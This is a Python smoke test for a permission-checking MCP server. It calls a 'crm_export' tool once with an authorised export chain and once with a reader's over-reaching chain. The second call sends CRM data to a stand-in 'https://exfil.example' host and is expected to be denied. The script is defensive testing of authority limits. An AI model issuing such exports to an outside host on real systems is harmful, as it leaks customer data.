"""live_smoke.py — the same server over stdio, driven by a real MCP client. Env-gated; never in CI.

    RUN_LIVE=1 python examples/integrations/mcp/server_verifier/live_smoke.py

Starts the guarded server as a stdio subprocess and calls it with a valid and an over-reaching chain.
"""
from __future__ import annotations

import asyncio
import os
import sys
from pathlib import Path

if os.environ.get("RUN_LIVE") != "1":
    print("skipped: set RUN_LIVE=1"); sys.exit(0)

sys.path.insert(0, str(Path(__file__).resolve().parent))
import demo  # noqa: E402


async def main() -> int:
    from mcp import StdioServerParameters, ClientSession
    from mcp.client.stdio import stdio_client
    import client as cl
    from attenu_guard.wire import HS256TestSigner
    here = Path(__file__).resolve().parent
    params = StdioServerParameters(command=sys.executable, args=[str(here / "stdio_main.py")],
                                   env={**os.environ, "ATTENU_VERIFIER_SECRET": "issuer-secret"})
    signer = HS256TestSigner(b"issuer-secret", kid="issuer-1")
    _, reader, exporter = demo.agents(signer)
    async with stdio_client(params) as (r, w):
        async with ClientSession(r, w) as s:
            await s.initialize()
            ok = await cl.call(s, "crm_export", {"destination": "https://partner.example"}, cl.chain_for(exporter, signer))
            deny = await cl.call(s, "crm_export", {"destination": "https://exfil.example"}, cl.chain_for(reader, signer))
    print("exporter:", ok); print("reader:", deny)
    return 0 if ok.get("exported_to") and deny.get("error") == "authority_denied" else 1


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
